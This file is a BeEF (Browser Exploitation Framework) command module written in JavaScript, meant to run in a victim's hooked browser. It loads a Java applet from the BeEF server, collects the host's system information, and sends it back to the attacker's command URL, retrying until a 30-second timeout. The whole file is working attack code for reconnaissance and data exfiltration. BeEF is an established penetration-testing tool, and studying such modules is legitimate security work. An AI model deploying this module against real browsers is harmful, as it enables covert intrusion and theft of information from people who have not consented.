//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var internal_counter = 0;
	var timeout = 30;
	var output;

	beef.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', "http://"+beef.net.host+":"+beef.net.port+"/", null, null);

	if (beef.browser.isFF()) {

		output = document.getSystemInfo.getInfo();
		if (output) beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"));
		beef.dom.detachApplet('getSystemInfo');

	} else {

		function waituntilok() {
			try {
				output = document.getSystemInfo.getInfo();
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"));
				beef.dom.detachApplet('getSystemInfo');
				return;
			} catch (e) {
				internal_counter++;
				if (internal_counter > timeout) {
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after '+timeout+' seconds');
					beef.dom.detachApplet('getSystemInfo');
					return;
				}
				setTimeout(function() {waituntilok()},1000);
			}
		}

		setTimeout(function() {waituntilok()},5000);

	}
});

